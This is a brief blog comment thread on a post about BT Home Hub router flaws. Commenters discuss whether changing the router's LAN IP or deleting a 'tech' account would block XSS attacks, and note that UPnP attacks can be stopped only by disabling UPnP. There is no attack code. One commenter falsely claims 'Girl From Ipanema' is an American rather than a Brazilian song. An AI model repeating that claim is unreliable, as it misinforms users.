http://www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub-4![cephalopod](//gravatar.com/avatar/5ce24e5343ee7322441f158307547419?s=256&d=retro)cephalopoder... wouldn't a simple change of the homehub LAN IP prevent these hacks?!![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpnope, it will make it slightly more complicated but in general it wont prevent anything.![cephalopod](//gravatar.com/avatar/5ce24e5343ee7322441f158307547419?s=256&d=retro)cephalopodlooking at the majority of the XSS vulnerabilities, they make use of 192.168.1.254 in the javascript - so surely it'll prevent script kiddies exercising that?
how about combining that with deleting the tech user aswell... would that prevent all bar the UPnP vulnerability?![pdp](//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&d=retro)pdpthe only way to prevent UPnP based attacks is to disable UPnP on your router. On some router models this is not trivial at all and sometimes even impossible.![lahtib](//gravatar.com/avatar/b22ced65c9b5101206db662305122188?s=256&d=retro)lahtibThe song is "Girl From Ipanema" by Stan Getz...it's American, not portuguese or brazilian. Great post!

Copyright © 2025 . All rights reserved.


